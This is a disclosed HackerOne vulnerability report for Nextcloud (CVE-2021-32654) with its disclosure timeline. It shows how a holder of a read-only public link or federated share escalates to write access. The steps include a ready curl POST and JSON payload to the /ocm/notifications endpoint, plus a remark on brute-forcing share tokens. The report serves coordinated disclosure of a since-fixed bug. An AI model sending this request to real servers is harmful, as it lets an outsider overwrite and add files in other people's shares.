---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/improper-authentication-generic
  - env/web
substate: "resolved"
weakness: "Improper Authentication - Generic"
enriched: true
body: true
date: 2021-06-10
submitted: 2021-04-20T20:48:20.362Z
bounty_usd: 4000
votes: 142
cve: "CVE-2021-32654"
program: "[[programs/nextcloud|Nextcloud]]"
reporter: "rtod"
source: "https://hackerone.com/reports/1170024"
title: "Attacker can obtain write access to any federated share/public link"
---
# Attacker can obtain write access to any federated share/public link

> **Severity:** High | **Bounty:** 4,000 USD | **Votes:** 142 | **Program:** Nextcloud | **Disclosed:** 2021-06-10

- Report: [https://hackerone.com/reports/1170024](https://hackerone.com/reports/1170024)
- CWE: Improper Authentication - Generic | CVE: CVE-2021-32654
- Submitted: 2021-04-20T20:48:20.362Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

Hi mates,

I stumbled across this with public links. But the same holds true for any federated share. I will try to describe the link scenario.
At first I thought there were more steps (and resharing was involved). But it really is very simples:

1. An attacker obtains a public link (again plenty of those around). For the sake of the attack it is a read only public link
2. The attacker uses the 'add to my nextcloud' functionality to have a federated share created to their own instance
3. The attacker accepts this share
4. Now the attacker checks their database and finds the entry in the `oc_share_external` table.

We are looking for really only the remote id. And the token.
For the sake of this example the `remote id = 2` and the `token = nOxdNJkb1xbI1VX`

5. Now we craft our request

```
curl -v -X POST http://localhost/index.php/ocm/notifications -d '{"notificationType":"RESHARE_CHANGE_PERMISSION","resourceType":"file","providerId":2,"notification":{"sharedSecret":"nOxdNJkb1xbI1VX","permission":["read","write","share"]}}' -H 'Content-type: application/json'
```

To break this down.
We send an (anonymous) POST request to the victims server to be precise to index.php/ocm/notifications
And we pass it the following json

```json
{
   "notificationType":"RESHARE_CHANGE_PERMISSION",
   "resourceType":"file",
   "providerId":2,
   "notification":{
      "sharedSecret":"nOxdNJkb1xbI1VX",
      "permission":[
         "read",
         "write",
         "share"
      ]
   }
}
```

6. The attacker now enjoys their federated share with READ+WRITE+UPDATE+CREATE+SHARE access. (I think it is probably even a bug that there is no way to grant DELETE).


Since we create a federated share at step 1. This also holds true for any created federated share.

## Impact

In short if an attacker has a public link. Or a federated share with them they can elevate their permissions very easily.

This allows them to overwrite files. Add new files. And so on. In short the integrity of all files in public links and federated shares should be considered compromised.

Pardon my directness. But you really should take a serious look at your federation code. As it seems to miss checks all over the place. Maybe recommending everybody to disable it for now is the best course of action.

## Timeline

- **Report Filed**
- **2021-04-20** @Nextcloud: Thanks a lot for reporting this potential issue back to us!

Our security team will take a look at this issue as soon as possible. We will reply to your report within 72 hours, usually much faster. For obvious reasons we'd like to ask you to not disclose this issue to any other party.
- **Report Triaged**
- **2021-04-21** @rtod: Also please note that there is no rate limiting at all on these endpoints.
So somebody with sufficient time and resources could also start brute forcing (unlikely with so many tokens). Still rate limiting there is not unreasonable.
- **2021-04-22** @rtod: Something I just verified. But with this bug https://hackerone.com/reports/1167929 is actually a lot worse.
As that means that filedrop links can also be converted to federated shares and then have increased permissions. Allow the attacker to also read data they are not supposed to.
- **Bounty Awarded**
- **2021-05-01** @rtod: Thanks a lot for the bounty. I assume the fix is in your recent RCs?

Out of personal interest. How will this be announced/disclosed?
- **2021-05-03** @lukasreschkenc: > Thanks a lot for the bounty. I assume the fix is in your recent RCs?

It should indeed be included. If you are still able to reproduce this, please do let us know :)

> Out of personal interest. How will this be announced/disclosed?

We're aiming to announce the minor releases at the end of this week, the release notes will contain our regular advice that updating is importing for security reasons but will not contain any details.

After 3-4 weeks, we'll be publishing an advisory, where we will credit you.
- **2021-05-10** @rtod: So I guess last week didn't make it? This week then?
- **Report Resolved**
- **Agreed On Going Public**
- **Cve Id Added**
- **2021-06-01** @lukasreschkenc: Advisory is at https://github.com/nextcloud/security-advisories/security/advisories/GHSA-jf9h-v24c-22g5
- **Report Became Public**
